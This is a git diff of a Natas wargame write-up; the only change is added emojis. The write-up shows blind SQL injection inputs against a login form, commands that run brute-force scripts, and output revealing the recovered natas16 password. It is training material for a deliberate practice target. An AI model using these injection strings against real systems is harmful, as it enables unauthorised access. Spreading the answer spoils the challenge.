@@ -91,9 +91,9 @@ Username: <input name="username"><br>
 </html>
 
 # Manual Brute Force (To long)
-Username: natas16" AND password LIKE BINARY "h%
+Username: natas16" AND password LIKE BINARY "h% ⌨️
     This user exists.
-Username: natas16" AND password LIKE BINARY "hP%
+Username: natas16" AND password LIKE BINARY "hP% ⌨️
     This user exists.
 
 # Brute Force (/scripts/blindsqlinjection.py)
@@ -120,13 +120,13 @@ while(True):
  if len(current_password) == 32:
   break
 
-@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection.py ❤️
+@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection.py ⌨️❤️
 Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGl
 Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGm
 Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGn
 Trying with: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo 🔐
 
-@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection2.py ❤️
+@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 ./scripts/blindsqlinjection2.py ⌨️❤️
 Found one more char : h
 Found one more char : hP
 Found one more char : hPk
